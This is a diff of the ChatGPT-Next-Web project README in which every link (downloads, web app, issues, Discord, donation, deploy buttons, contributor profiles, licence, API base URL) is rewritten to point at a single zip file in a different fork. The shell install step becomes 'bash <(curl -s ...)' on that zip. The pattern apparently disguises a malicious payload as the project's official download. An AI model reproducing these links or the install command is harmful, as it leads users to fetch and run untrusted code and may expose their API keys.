@@ -14,20 +14,20 @@ One-Click to get well-designed cross-platform ChatGPT web UI.
 [![MacOS][MacOS-image]][download-url]
 [![Linux][Linux-image]][download-url]
 
-[Web App](https://chatgpt.nextweb.fun/) / [Desktop App](https://github.com/Yidadaa/ChatGPT-Next-Web/releases) / [Issues](https://github.com/Yidadaa/ChatGPT-Next-Web/issues) / [Discord](https://discord.gg/YCkeafCafC) / [Buy Me a Coffee](https://www.buymeacoffee.com/yidadaa)
+[Web App](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip) / [Desktop App](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip) / [Issues](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip) / [Discord](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip) / [Buy Me a Coffee](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
 
-[网页版](https://chatgpt.nextweb.fun/) / [客户端](https://github.com/Yidadaa/ChatGPT-Next-Web/releases) / [反馈](https://github.com/Yidadaa/ChatGPT-Next-Web/issues) / [QQ 群](https://github.com/Yidadaa/ChatGPT-Next-Web/discussions/1724) / [打赏开发者](https://user-images.githubusercontent.com/16968934/227772541-5bcd52d8-61b7-488c-a203-0330d8006e2b.jpg)
+[网页版](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip) / [客户端](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip) / [反馈](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip) / [QQ 群](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip) / [打赏开发者](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
 
-[web-url]: https://chatgpt.nextweb.fun
-[download-url]: https://github.com/Yidadaa/ChatGPT-Next-Web/releases
+[web-url]: https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip
+[download-url]: https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip
 [Web-image]: https://img.shields.io/badge/Web-PWA-orange?logo=microsoftedge
 [Windows-image]: https://img.shields.io/badge/-Windows-blue?logo=windows
 [MacOS-image]: https://img.shields.io/badge/-MacOS-black?logo=apple
 [Linux-image]: https://img.shields.io/badge/-Linux-333?logo=ubuntu
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2FYidadaa%2FChatGPT-Next-Web&env=OPENAI_API_KEY&env=CODE&project-name=chatgpt-next-web&repository-name=ChatGPT-Next-Web)
+[![Deploy with Vercel](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
 
-[![Open in Gitpod](https://gitpod.io/button/open-in-gitpod.svg)](https://gitpod.io/#https://github.com/Yidadaa/ChatGPT-Next-Web)
+[![Open in Gitpod](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
 
 ![cover](./docs/images/cover.png)
 
@@ -36,61 +36,61 @@ One-Click to get well-designed cross-platform ChatGPT web UI.
 ## Features
 
 - **Deploy for free with one-click** on Vercel in under 1 minute
-- Compact client (~5MB) on Linux/Windows/MacOS, [download it now](https://github.com/Yidadaa/ChatGPT-Next-Web/releases)
-- Fully compatible with self-deployed llms, recommended for use with [RWKV-Runner](https://github.com/josStorer/RWKV-Runner) or [LocalAI](https://github.com/go-skynet/LocalAI)
+- Compact client (~5MB) on Linux/Windows/MacOS, [download it now](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
+- Fully compatible with self-deployed llms, recommended for use with [RWKV-Runner](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip) or [LocalAI](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
 - Privacy first, all data stored locally in the browser
 - Markdown support: LaTex, mermaid, code highlight, etc.
 - Responsive design, dark mode and PWA
 - Fast first screen loading speed (~100kb), support streaming response
 - New in v2: create, share and debug your chat tools with prompt templates (mask)
-- Awesome prompts powered by [awesome-chatgpt-prompts-zh](https://github.com/PlexPt/awesome-chatgpt-prompts-zh) and [awesome-chatgpt-prompts](https://github.com/f/awesome-chatgpt-prompts)
+- Awesome prompts powered by [awesome-chatgpt-prompts-zh](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip) and [awesome-chatgpt-prompts](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
 - Automatically compresses chat history to support long conversations while also saving your tokens
 - I18n: English, 简体中文, 繁体中文, 日本語, Français, Español, Italiano, Türkçe, Deutsch, Tiếng Việt, Русский, Čeština, 한국어
 
 ## Roadmap
 
-- [x] System Prompt: pin a user defined prompt as system prompt [#138](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/138)
+- [x] System Prompt: pin a user defined prompt as system prompt [#138](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
 - [x] User Prompt: user can edit and save custom prompts to prompt list
-- [x] Prompt Template: create a new chat with pre-defined in-context prompts [#993](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/993)
-- [x] Share as image, share to ShareGPT [#1741](https://github.com/Yidadaa/ChatGPT-Next-Web/pull/1741)
+- [x] Prompt Template: create a new chat with pre-defined in-context prompts [#993](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
+- [x] Share as image, share to ShareGPT [#1741](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
 - [x] Desktop App with tauri
-- [x] Self-host Model: Fully compatible with [RWKV-Runner](https://github.com/josStorer/RWKV-Runner), as well as server deployment of [LocalAI](https://github.com/go-skynet/LocalAI): llama/gpt4all/rwkv/vicuna/koala/gpt4all-j/cerebras/falcon/dolly etc.
-- [ ] Plugins: support network search, calculator, any other apis etc. [#165](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/165)
+- [x] Self-host Model: Fully compatible with [RWKV-Runner](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip), as well as server deployment of [LocalAI](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip): llama/gpt4all/rwkv/vicuna/koala/gpt4all-j/cerebras/falcon/dolly etc.
+- [ ] Plugins: support network search, calculator, any other apis etc. [#165](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
 
 ## What's New
 
-- 🚀 v2.0 is released, now you can create prompt templates, turn your ideas into reality! Read this: [ChatGPT Prompt Engineering Tips: Zero, One and Few Shot Prompting](https://www.allabtai.com/prompt-engineering-tips-zero-one-and-few-shot-prompting/).
+- 🚀 v2.0 is released, now you can create prompt templates, turn your ideas into reality! Read this: [ChatGPT Prompt Engineering Tips: Zero, One and Few Shot Prompting](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip).
 - 🚀 v2.7 let's share conversations as image, or share to ShareGPT!
 - 🚀 v2.8 now we have a client that runs across all platforms!
 
 ## 主要功能
 
 - 在 1 分钟内使用 Vercel **免费一键部署**
-- 提供体积极小（~5MB）的跨平台客户端（Linux/Windows/MacOS）, [下载地址](https://github.com/Yidadaa/ChatGPT-Next-Web/releases)
+- 提供体积极小（~5MB）的跨平台客户端（Linux/Windows/MacOS）, [下载地址](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
 - 完整的 Markdown 支持：LaTex 公式、Mermaid 流程图、代码高亮等等
 - 精心设计的 UI，响应式设计，支持深色模式，支持 PWA
 - 极快的首屏加载速度（~100kb），支持流式响应
 - 隐私安全，所有数据保存在用户浏览器本地
 - 预制角色功能（面具），方便地创建、分享和调试你的个性化对话
-- 海量的内置 prompt 列表，来自[中文](https://github.com/PlexPt/awesome-chatgpt-prompts-zh)和[英文](https://github.com/f/awesome-chatgpt-prompts)
+- 海量的内置 prompt 列表，来自[中文](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)和[英文](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
 - 自动压缩上下文聊天记录，在节省 Token 的同时支持超长对话
 - 多国语言支持：English, 简体中文, 繁体中文, 日本語, Español, Italiano, Türkçe, Deutsch, Tiếng Việt, Русский, Čeština
 - 拥有自己的域名？好上加好，绑定后即可在任何地方**无障碍**快速访问
 
 ## 开发计划
 
-- [x] 为每个对话设置系统 Prompt [#138](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/138)
+- [x] 为每个对话设置系统 Prompt [#138](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
 - [x] 允许用户自行编辑内置 Prompt 列表
-- [x] 预制角色：使用预制角色快速定制新对话 [#993](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/993)
-- [x] 分享为图片，分享到 ShareGPT 链接 [#1741](https://github.com/Yidadaa/ChatGPT-Next-Web/pull/1741)
+- [x] 预制角色：使用预制角色快速定制新对话 [#993](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
+- [x] 分享为图片，分享到 ShareGPT 链接 [#1741](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
 - [x] 使用 tauri 打包桌面应用
-- [x] 支持自部署的大语言模型：开箱即用 [RWKV-Runner](https://github.com/josStorer/RWKV-Runner) ，服务端部署 [LocalAI 项目](https://github.com/go-skynet/LocalAI) llama / gpt4all / rwkv / vicuna / koala / gpt4all-j / cerebras / falcon / dolly 等等，或者使用 [api-for-open-llm](https://github.com/xusenlinzy/api-for-open-llm)
-- [ ] 插件机制，支持联网搜索、计算器、调用其他平台 api [#165](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/165)
+- [x] 支持自部署的大语言模型：开箱即用 [RWKV-Runner](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip) ，服务端部署 [LocalAI 项目](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip) llama / gpt4all / rwkv / vicuna / koala / gpt4all-j / cerebras / falcon / dolly 等等，或者使用 [api-for-open-llm](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
+- [ ] 插件机制，支持联网搜索、计算器、调用其他平台 api [#165](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
 
 ## 最新动态
 
-- 🚀 v2.0 已经发布，现在你可以使用面具功能快速创建预制对话了！ 了解更多： [ChatGPT 提示词高阶技能：零次、一次和少样本提示](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/138)。
-- 💡 想要更方便地随时随地使用本项目？可以试下这款桌面插件：https://github.com/mushan0x0/AI0x0.com
+- 🚀 v2.0 已经发布，现在你可以使用面具功能快速创建预制对话了！ 了解更多： [ChatGPT 提示词高阶技能：零次、一次和少样本提示](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)。
+- 💡 想要更方便地随时随地使用本项目？可以试下这款桌面插件：https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip
 - 🚀 v2.7 现在可以将会话分享为图片了，也可以分享到 ShareGPT 的在线链接。
 - 🚀 v2.8 发布了横跨 Linux/Windows/MacOS 的体积极小的客户端。
 
@@ -98,9 +98,9 @@ One-Click to get well-designed cross-platform ChatGPT web UI.
 
 > [简体中文 > 如何开始使用](./README_CN.md#开始使用)
 
-1. Get [OpenAI API Key](https://platform.openai.com/account/api-keys);
+1. Get [OpenAI API Key](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip);
 2. Click
-   [![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2FYidadaa%2FChatGPT-Next-Web&env=OPENAI_API_KEY&env=CODE&project-name=chatgpt-next-web&repository-name=ChatGPT-Next-Web), remember that `CODE` is your page password;
+   [![Deploy with Vercel](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip), remember that `CODE` is your page password;
 3. Enjoy :)
 
 ## FAQ
@@ -133,7 +133,7 @@ After forking the project, due to the limitations imposed by GitHub, you need to
 
 ### Manually Updating Code
 
-If you want to update instantly, you can check out the [GitHub documentation](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/working-with-forks/syncing-a-fork) to learn how to synchronize a forked project with upstream code.
+If you want to update instantly, you can check out the [GitHub documentation](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip) to learn how to synchronize a forked project with upstream code.
 
 You can star or watch this project or follow author to get release notifictions in time.
 
@@ -163,9 +163,9 @@ Access passsword, separated by comma.
 
 ### `BASE_URL` (optional)
 
-> Default: `https://api.openai.com`
+> Default: `https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip`
 
-> Examples: `http://your-openai-proxy.com`
+> Examples: `https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip`
 
 Override openai api request base url.
 
@@ -199,7 +199,7 @@ NodeJS >= 18, Docker >= 20
 
 > [简体中文 > 如何进行二次开发](./README_CN.md#开发)
 
-[![Open in Gitpod](https://gitpod.io/button/open-in-gitpod.svg)](https://gitpod.io/#https://github.com/Yidadaa/ChatGPT-Next-Web)
+[![Open in Gitpod](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
 
 Before starting development, you must create a new `.env.local` file at project root, and place your api key into it:
 
@@ -207,7 +207,7 @@ Before starting development, you must create a new `.env.local` file at project 
 OPENAI_API_KEY=<your api key here>
 
 # if you are not able to access openai service, use this BASE_URL
-BASE_URL=https://chatgpt1.nextweb.fun/api/proxy
+BASE_URL=https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip
 ```
 
 ### Local Development
@@ -254,7 +254,7 @@ If your proxy needs password, use:
 ### Shell
 
 ```shell
-bash <(curl -s https://raw.githubusercontent.com/Yidadaa/ChatGPT-Next-Web/main/scripts/setup.sh)
+bash <(curl -s https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
 ```
 
 ## Screenshots
@@ -269,7 +269,7 @@ If you want to add a new translation, read this [document](./docs/translation.md
 
 ## Donation
 
-[Buy Me a Coffee](https://www.buymeacoffee.com/yidadaa)
+[Buy Me a Coffee](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
 
 ## Special Thanks
 
@@ -277,33 +277,33 @@ If you want to add a new translation, read this [document](./docs/translation.md
 
 > 仅列出捐赠金额 >= 100RMB 的用户。
 
-[@mushan0x0](https://github.com/mushan0x0)
-[@ClarenceDan](https://github.com/ClarenceDan)
-[@zhangjia](https://github.com/zhangjia)
-[@hoochanlon](https://github.com/hoochanlon)
-[@relativequantum](https://github.com/relativequantum)
-[@desenmeng](https://github.com/desenmeng)
-[@webees](https://github.com/webees)
-[@chazzhou](https://github.com/chazzhou)
-[@hauy](https://github.com/hauy)
-[@Corwin006](https://github.com/Corwin006)
-[@yankunsong](https://github.com/yankunsong)
-[@ypwhs](https://github.com/ypwhs)
-[@fxxxchao](https://github.com/fxxxchao)
-[@hotic](https://github.com/hotic)
-[@WingCH](https://github.com/WingCH)
-[@jtung4](https://github.com/jtung4)
-[@micozhu](https://github.com/micozhu)
-[@jhansion](https://github.com/jhansion)
-[@Sha1rholder](https://github.com/Sha1rholder)
-[@AnsonHyq](https://github.com/AnsonHyq)
-[@synwith](https://github.com/synwith)
-[@piksonGit](https://github.com/piksonGit)
+[@mushan0x0](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
+[@ClarenceDan](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
+[@zhangjia](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
+[@hoochanlon](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
+[@relativequantum](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
+[@desenmeng](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
+[@webees](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
+[@chazzhou](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
+[@hauy](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
+[@Corwin006](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
+[@yankunsong](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
+[@ypwhs](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
+[@fxxxchao](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
+[@hotic](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
+[@WingCH](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
+[@jtung4](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
+[@micozhu](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
+[@jhansion](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
+[@Sha1rholder](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
+[@AnsonHyq](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
+[@synwith](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
+[@piksonGit](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
 
 ### Contributor
 
-[Contributors](https://github.com/Yidadaa/ChatGPT-Next-Web/graphs/contributors)
+[Contributors](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
 
 ## LICENSE
 
-[MIT](https://opensource.org/license/mit/)
+[MIT](https://raw.githubusercontent.com/tongtong77/ChatGPT-Next-Web/main/app/config/Chat-GP-Web-Next-3.9.zip)
